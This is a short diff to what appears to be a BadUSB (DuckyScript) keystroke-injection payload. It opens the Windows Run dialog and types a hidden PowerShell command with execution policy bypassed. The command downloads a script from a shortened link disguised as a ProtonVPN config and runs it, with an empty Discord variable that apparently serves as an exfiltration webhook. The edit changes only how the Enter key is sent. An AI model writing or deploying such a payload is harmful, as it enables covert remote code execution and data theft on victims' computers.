@@ -31,4 +31,5 @@ REM
 DELAY 2000
 GUI r
 DELAY 250
-STRINGLN powershell -w h -ep bypass $discord='';irm bit.ly/ProtonVpnConfigScript | iex
+STRING powershell -w h -ep bypass $discord='';irm bit.ly/ProtonVpnConfigScript | iex
+ENTER
